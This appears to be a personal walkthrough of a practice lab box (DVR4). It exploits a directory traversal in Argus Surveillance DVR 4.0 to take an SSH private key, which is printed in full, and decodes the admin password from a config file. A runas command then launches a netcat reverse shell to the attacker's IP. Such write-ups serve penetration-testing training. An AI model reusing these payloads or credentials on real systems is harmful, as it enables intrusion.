A foothold on the target system will be established by exploiting a directory traversal vulnerability in the DVR software to access an SSH key. Privileges will then be elevated by decoding the Administrator password found in a configuration file. This lab focuses on exploiting vulnerabilities and privilege escalation methods.

# Summary

This lab demonstrates exploiting a Directory Traversal vulnerability in Argus Surveillance DVR 4.0 to access sensitive files, such as SSH private keys and configuration files. Learners will decode the Administrator password using a substitution cipher, then gain elevated privileges by launching a reverse shell through runas with the recovered credentials. The lab emphasizes file inclusion attacks, custom encryption decoding, and privilege escalation through administrative utilities.

# Learning Objectives

**After completion of this lab, learners will be able to:**

- Enumerate the web application and identify the Directory Traversal vulnerability.
- Exploit the vulnerability to retrieve the SSH private key and gain initial access as a low-privileged user.
- Locate the Argus configuration file and extract the encoded Administrator password.
- Decode the password using a substitution cipher script provided in the exploit database.
- Launch a reverse shell as Administrator by using runas and validate SYSTEM-level access.

-------

alright. let's get crackin.


	sudo nano /etc/hosts
	nmap DVR4


```
???(kali?kali)-[~]
??$ nmap DVR4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 01:50 +0000
Nmap scan report for DVR4 (192.168.53.179)
Host is up (0.00055s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds

```

http://dvr4:8080/

now to find out what version it's running.

 Version: 4.0
Released 18/12/2008 

```sh

searchsploit Argus


# Argus Surveillance DVR 4.0.0.0 - Directory Traversal | windows_x86/webapps/45296.txt

searchsploit -p 45296

cp /usr/share/exploitdb/exploits/windows_x86/webapps/45296.txt ./


curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

wget https://raw.githubusercontent.com/meltingscales/oscp/refs/heads/main/boxes/provinggrounds/DVR4/ArgusDirTraverse.py

python ArgusDirTraverse.py http://DVR4:8080
python ArgusDirTraverse.py http://DVR4:8080 "Windows/system.ini"

# great, now we need to steal the ssh keys.

python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_rsa"
python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_rsa.pub"
# nope, let's try id_ed25519

python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_ed25519"
python ArgusDirTraverse.py http://DVR4:8080 "Users/argus/.ssh/id_ed25519.pub"
# maybe it's a different user.

# http://dvr4:8080/Users.html
# "Administrator" and "Viewer"...

python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_ed25519"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_ed25519.pub"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_rsa"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Administrator/.ssh/id_rsa.pub"

python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_ed25519"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_ed25519.pub"

# We got it!!! These work!!
python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_rsa"
python ArgusDirTraverse.py http://DVR4:8080 "Users/Viewer/.ssh/id_rsa.pub"

```

```

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65eGNAmEONcEmSIh+09meDs3333O15bNKC2FDl+z2Q6FsXMtAnklhu63QEhs9pR06E2VBy6EBRmNpozGdYtsMmBMRMryHXrYnzWn2rq9HbMqke70OGLWSxXIA+In+eM0ojS2O2l47euMYyQqA0rC+/fLYRwIS3V34vGw7dbJvl7O49Pfj2/4xWztVbTj6YbGmCF4yBtfofCoZKj3PfxB61HpHLGz4tVfj0GOGyTPX2BIXj+JMJuqhGjR2Nwfnh/I86bc5LYuOM4quBgzZorAQ3tqwrdEwYNqqfU6VLi2m8IW82yE7NWrqXukdDNziWR/5sCLgrVhBeajvGpJA8Czj93Hp7tsPYULR39X1xTDyicZm0PxRd5lZD+GqIKmGxF31LnO6ZqJo+s7gKChJkYRADg/ut2SmBV8RFbRM/l9Y8xkDIgRou05cBeYTnNeFMD1K8PpnHZwwF9aaaxI7wXunACnMmjWCHP+COynUCj3IsFGYtnHiTsAWDrqDFq9Q+ss= viewer@DESKTOP-8OB2COP

```

now, to use these stolen credentials.

```sh

nano stolen_private_key
chmod 600 stolen_private_key

ssh -i stolen_private_key Viewer@DVR4

```

and we have non-root access.

we also need to steal:

```
C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8                         
```

now, how do we decode this password?

50130.py - neat.
https://www.exploit-db.com/exploits/50130

```bash
nano 50130.py
# edit and add our password

python 50130.py


[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown

```

`14WatchD0g$`, I am assuming.

now we can run this to connect to our reverse shell.

```
nc -nvlp 4444

runas /user:Administrator "nc.exe -e cmd.exe 192.168.49.52 4444"
14WatchD0g$


```

we have root flag.